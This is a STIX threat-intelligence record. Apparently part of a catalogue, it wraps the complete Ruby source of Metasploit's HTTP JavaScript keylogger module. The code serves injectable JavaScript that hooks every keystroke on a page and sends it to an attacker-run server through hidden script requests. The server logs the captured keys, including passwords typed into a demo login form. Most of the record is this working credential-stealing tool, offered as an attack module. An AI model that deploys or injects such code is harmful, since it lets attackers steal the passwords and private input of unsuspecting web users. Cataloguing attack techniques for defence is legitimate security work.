{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5186ad2f-725d-4f54-b719-33e134291ae6",
    "created": "2024-08-14T16:22:00.817486Z",
    "modified": "2024-08-14T16:22:00.81749Z",
    "name": "Capture: HTTP JavaScript Keylogger",
    "description": " This modules runs a web server that demonstrates keystroke logging through JavaScript. The DEMO option can be set to enable a page that demonstrates this technique. Future improvements will allow for a configurable template to be used with this module. To use this module with an existing web page, simply add a",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/http_javascript_keylogger.rb",
            "external_id": "http_javascript_keylogger.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t\t=> 'Capture: HTTP JavaScript Keylogger',\n      'Description'\t=> %q{\n          This modules runs a web server that demonstrates keystroke\n        logging through JavaScript. The DEMO option can be set to enable\n        a page that demonstrates this technique. Future improvements will\n        allow for a configurable template to be used with this module.\n        To use this module with an existing web page, simply add a\n        script source tag pointing to the URL of this service ending\n        in the .js extension. For example, if URIPATH is set to \"test\",\n        the following URL will load this script into the calling site:\n        http://server:port/test/anything.js\n      },\n      'License'\t=> MSF_LICENSE,\n      'Author'\t=> ['Marcus J. Carey <mjc[at]threatagent.com>', 'hdm']\n  ))\n\n  register_options(\n    [\n      OptBool.new('DEMO', [true, \"Creates HTML for demo purposes\", false]),\n    ])\n  end\n\n\n  # This is the module's main runtime method\n  def run\n    @seed = Rex::Text.rand_text_alpha(12)\n    @client_cache = {}\n\n    # Starts Web Server\n    exploit\n  end\n\n  # This handles the HTTP responses for the Web server\n  def on_request_uri(cli, request)\n\n    cid = nil\n\n    if request['Cookie'].to_s =~ /,?\\s*id=([a-f0-9]{4,32})/i\n      cid = $1\n    end\n\n    if not cid and request.qstring['id'].to_s =~ /^([a-f0-9]{4,32})/i\n      cid = $1\n    end\n\n    data = request.qstring['data']\n\n    unless cid\n      cid = generate_client_id(cli,request)\n      print_status(\"Assigning client identifier '#{cid}'\")\n\n      resp = create_response(302, 'Moved')\n      resp['Content-Type'] = 'text/html'\n      resp['Location']     = request.uri + '?id=' + cid\n      resp['Set-Cookie']   = \"id=#{cid}\"\n      cli.send_response(resp)\n      return\n    end\n\n    base_url = generate_base_url(cli, request)\n\n    #print_status(\"#{cli.peerhost} [#{cid}] Incoming #{request.method} request for #{request.uri}\")\n\n    case request.uri\n    when /\\.js(\\?|$)/\n      content_type = \"text/plain\"\n      send_response(cli, generate_keylogger_js(base_url, cid), {'Content-Type'=> content_type, 'Set-Cookie' => \"id=#{cid}\"})\n\n    when /\\/demo\\/?(\\?|$)/\n      if datastore['DEMO']\n        content_type = \"text/html\"\n        send_response(cli, generate_demo(base_url, cid), {'Content-Type'=> content_type, 'Set-Cookie' => \"id=#{cid}\"})\n      else\n        send_not_found(cli)\n      end\n\n    else\n      if data\n        nice = process_data(cli, request, cid, data)\n        script = datastore['DEMO'] ? generate_demo_js_reply(base_url, cid, nice) : \"\"\n        send_response(cli, script, {'Content-Type' => \"text/plain\", 'Set-Cookie' => \"id=#{cid}\"})\n      else\n        if datastore['DEMO']\n          send_redirect(cli, \"/demo/?cid=#{cid}\")\n        else\n          send_not_found(cli)\n        end\n      end\n    end\n  end\n\n  # Figure out what our base URL is based on the user submitted\n  # Host header or the address of the client.\n  def generate_base_url(cli, req)\n    port = nil\n    host = Rex::Socket.source_address(cli.peerhost)\n\n    if req['Host']\n      host = req['Host']\n      bits = host.split(':')\n\n      # Extract the hostname:port sequence from the Host header\n      if bits.length > 1 and bits.last.to_i > 0\n        port = bits.pop.to_i\n        host = bits.join(':')\n      end\n    else\n      port = datastore['SRVPORT'].to_i\n    end\n\n    prot = (!! datastore['SSL']) ? 'https://' : 'http://'\n    if Rex::Socket.is_ipv6?(host)\n      host = \"[#{host}]\"\n    end\n\n    base = prot + host\n    if not ((prot == 'https' and port.nil?) or (prot == 'http' and port.nil?))\n      base << \":#{port}\"\n    end\n\n    base << get_resource\n  end\n\n  def process_data(cli, request, cid, data)\n\n    lines = [\"\"]\n    real  = \"\"\n\n    Rex::Text.uri_decode(data).split(\",\").each do |char|\n      byte = char.to_s.hex.chr\n      next if byte == \"\\x00\"\n      real << byte\n      case char.to_i\n      # Do Backspace\n      when 8\n        lines[-1] = lines[-1][0, lines[-1].length - 1] if lines[-1].length > 0\n      when 13\n        lines << \"\"\n      else\n        lines[-1] << byte\n      end\n    end\n\n    nice = lines.join(\"<CR>\").gsub(\"\\t\", \"<TAB>\")\n    real = real.gsub(\"\\x08\", \"<DEL>\")\n\n    if not @client_cache[cid]\n\n      fp = fingerprint_user_agent(request['User-Agent'] || \"\")\n      header  = \"Browser Keystroke Log\\n\"\n      header << \"=====================\\n\"\n      header << \"Created: #{Time.now.to_s}\\n\"\n      header << \"Address: #{cli.peerhost}\\n\"\n      header << \"     ID: #{cid}\\n\"\n      header << \" FPrint: #{fp.inspect}\\n\"\n      header << \"    URL: #{request.uri}\\n\"\n      header << \"\\n\"\n      header << \"====================\\n\\n\"\n\n      @client_cache[cid] = {\n        :created => Time.now.to_i,\n        :path_clean => store_loot(\"browser.keystrokes.clean\", \"text/plain\", cli.peerhost, header, \"keystrokes_clean_#{cid}.txt\", \"Browser Keystroke Logs (Clean)\"),\n        :path_raw   => store_loot(\"browser.keystrokes.raw\", \"text/plain\", cli.peerhost, header, \"keystrokes_clean_#{cid}.txt\", \"Browser Keystroke Logs (Raw)\")\n      }\n      print_good(\"[#{cid}] Logging clean keystrokes to: #{@client_cache[cid][:path_clean]}\")\n      print_good(\"[#{cid}] Logging raw keystrokes to: #{@client_cache[cid][:path_raw]}\")\n    end\n\n    ::File.open( @client_cache[cid][:path_clean], \"ab\") { |fd| fd.puts nice }\n    ::File.open( @client_cache[cid][:path_raw], \"ab\")   { |fd| fd.write(real) }\n\n    if nice.length > 0\n      print_good(\"[#{cid}] Keys: #{nice}\")\n    end\n\n    nice\n  end\n\n  def generate_client_id(cli, req)\n    \"%.8x\" % Kernel.rand(0x100000000)\n  end\n\n\n  def generate_demo(base_url, cid)\n    # This is the Demo Form Page <HTML>\n    html = <<EOS\n<html>\n<head>\n<title>Demo Form</title>\n<script type=\"text/javascript\" src=\"#{base_url}/#{@seed}.js?id=#{cid}\"></script>\n</head>\n<body bgcolor=\"white\">\n<br><br>\n<div align=\"center\">\n<h1>Keylogger Demo Form</h1>\n<form method=\\\"POST\\\" name=\\\"logonf\\\" action=\\\"#{base_url}/demo/?id=#{cid}\\\">\n<p><font color=\"red\"><i>This form submits data to the Metasploit listener for demonstration purposes.</i></font>\n<br><br>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\n<tr><td>Username:</td> <td><input name=\"username\" size=\"20\"></td> </tr>\n<tr><td>Password:</td> <td><input type=\"password\" name=\"password\" size=\"20\"></td> </tr>\n</table>\n<p align=\"center\"><input type=\"submit\" value=\"Submit\"></p></form>\n\n<br/>\n<textarea cols=\"80\" rows=\"5\" id=\"results\">\n</textarea>\n\n</div>\n</body>\n</html>\nEOS\n    return html\n  end\n\n  # This is the JavaScript Key Logger Code\n  def generate_keylogger_js(base_url, cid)\n\n    targ = Rex::Text.rand_text_alpha(12)\n\n    code = <<EOS\n\nvar c#{@seed} = 0;\nwindow.onload = function load#{@seed}(){\n  l#{@seed} = \",\";\n\n  if (window.addEventListener) {\n    document.addEventListener('keypress', p#{@seed}, true);\n    document.addEventListener('keydown', d#{@seed}, true);\n  } else if (window.attachEvent) {\n    document.attachEvent('onkeypress', p#{@seed});\n    document.attachEvent('onkeydown', d#{@seed});\n  } else {\n    document.onkeypress = p#{@seed};\n    document.onkeydown = d#{@seed};\n  }\n\n}\nfunction p#{@seed}(e){\n  k#{@seed} = (window.event) ? window.event.keyCode : e.which;\n  k#{@seed} = k#{@seed}.toString(16);\n  if (k#{@seed} != \"d\"){\n    #{@seed}(k#{@seed});\n  }\n}\nfunction d#{@seed}(e){\n  k#{@seed} = (window.event) ? window.event.keyCode : e.which;\n  if (k#{@seed} == 9 || k#{@seed} == 8 || k#{@seed} == 13){\n    #{@seed}(k#{@seed});\n  }\n}\n\nfunction #{@seed}(k#{@seed}){\n  l#{@seed} = l#{@seed} + k#{@seed} + \",\";\n\n  var t#{@seed} = \"#{targ}\" + c#{@seed};\n  c#{@seed}++;\n\n  var f#{@seed};\n\n  if (document.all)\n    f#{@seed} = document.createElement(\"<script name='\" + t#{@seed} + \"' id='\" + t#{@seed} + \"'></script>\");\n  else {\n    f#{@seed} = document.createElement(\"script\");\n    f#{@seed}.setAttribute(\"id\", t#{@seed});\n    f#{@seed}.setAttribute(\"name\", t#{@seed});\n  }\n\n  f#{@seed}.setAttribute(\"src\", \"#{base_url}?id=#{cid}&data=\" + l#{@seed});\n  f#{@seed}.style.visibility = \"hidden\";\n\n  document.body.appendChild(f#{@seed});\n\n  if (k#{@seed} == 13 || l#{@seed}.length > 3000)\n    l#{@seed} = \",\";\n\n  setTimeout('document.body.removeChild(document.getElementById(\"' + t#{@seed} + '\"))', 5000);\n}\nEOS\n    return code\n  end\n\n  def generate_demo_js_reply(base_url, cid, data)\n    code = <<EOS\n      try {\n        document.getElementById(\"results\").value = \"Keystrokes: #{data}\";\n      } catch(e) { }\nEOS\n    return code\n  end\nend\n",
    "x_mitre_contributors": [
        "[Marcus J. Carey <mjc[at]threatagent.com>",
        "hdm"
    ]
}